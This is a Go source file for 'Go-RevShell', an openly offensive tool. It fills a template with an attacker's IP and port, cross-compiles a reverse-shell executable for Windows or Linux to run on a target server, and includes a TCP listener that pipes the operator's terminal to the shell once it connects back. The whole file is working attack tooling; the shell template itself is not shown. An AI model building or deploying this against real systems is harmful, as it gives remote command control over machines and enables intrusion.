package main

import (
	"bytes"
	"flag"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
)

const banner string = `
  ____                   ____                   ____    _              _   _
 / ___|   ___           |  _ \    ___  __   __ / ___|  | |__     ___  | | | |
| |  _   / _ \   _____  | |_) |  / _ \ \ \ / / \___ \  | '_ \   / _ \ | | | |
| |_| | | (_) | |_____| |  _ <  |  __/  \ V /   ___) | | | | | |  __/ | | | |
 \____|  \___/          |_| \_\  \___|   \_/   |____/  |_| |_|  \___| |_| |_|

`

func main() {
	host, shellPort, serverOs, listenPort := initArgs()
	println(banner)
	if listenPort != "0" {
		listenTcp(listenPort)
	} else {
		buildReverseShell(host, shellPort, serverOs)
	}
}

func initArgs() (string, string, string, string) {
	host := flag.String("i", "localhost", "IP of the host which the reverse shell will connect to.")
	shellPort := flag.String("p", "1111", "Port of the host which the reverse shell will connect to.")
	serverOs := flag.String("s", "linux", "OS of the server which will start the reverse shell (used to build the right binary) available : \"windows\", \"linux\".")
	listenPort := flag.String("l", "0", "Port to listen (you can use this argument to bind to your reverse shell).")
	flag.Parse()
	if flag.NFlag() == 0 {
		println("[+] No argument passed. Building a reverse shell using default values.")
	}
	return *host, *shellPort, *serverOs, *listenPort
}

func buildReverseShell(host, port, serverOs string) {
	println("[+] Compiling reverse shell for " + host + ":" + port + " ...")
	template, err := ioutil.ReadFile("templates/Go-RevShell.template")
	handleError("Reading template", err)
	template = bytes.ReplaceAll(template, []byte("template-host"), []byte(host))
	template = bytes.ReplaceAll(template, []byte("template-port"), []byte(port))
	tmpFileName, finalFileName, fileExt := "tmp.go", "Go-RevShell", ""
	handleError("Writing template to tmp file", ioutil.WriteFile(tmpFileName, template, 0600))
	if serverOs == "windows" {
		fileExt = ".exe"
	}
	handleError("Preaparing compilation (set GOOS to "+serverOs+")", os.Setenv("GOOS", serverOs))
	handleError("Compiling", exec.Command("go", "build", "-o", finalFileName+fileExt, tmpFileName).Run())
	handleError("Removing tmp file after compilation", os.Remove(tmpFileName))
	println("[+] Build is done ! The file to execute server side is \"" + finalFileName + fileExt + "\".")
}

func listenTcp(port string) {
	listener, err := net.Listen("tcp", ":"+port)
	handleError("TCP Listening for localhost:"+port, err)
	defer listener.Close()
	connexion, err := listener.Accept()
	handleError("Accepting TCP connection", err)
	stdin_chan, stdout_chan := make(chan int), make(chan int)
	go synchronizeClientServer(connexion, os.Stdout, stdout_chan)
	go synchronizeClientServer(os.Stdin, connexion, stdin_chan)
	select {
	case <-stdout_chan:
		println("[-] Remote connection is closed.") // Happen when closing connection from server side (with exit ie)
	case <-stdin_chan:
		println("[-] Local connection is closed.") // Happen when closing connection with signal client side (ctrl+c ie)
	}
}

func synchronizeClientServer(source io.Reader, destination io.Writer, sync_channel chan int) {
	buffer := make([]byte, 1024)
	for {
		nBytes, err := source.Read(buffer)
		if err != nil {
			break
		}
		_, err = destination.Write(buffer[0:nBytes])
		handleError("Writing to destination (listening)", err)
	}
	close(sync_channel)
}

func handleError(reason string, err error) {
	if err != nil {
		log.Println("[ERR] " + reason + " : " + err.Error())
	}
}
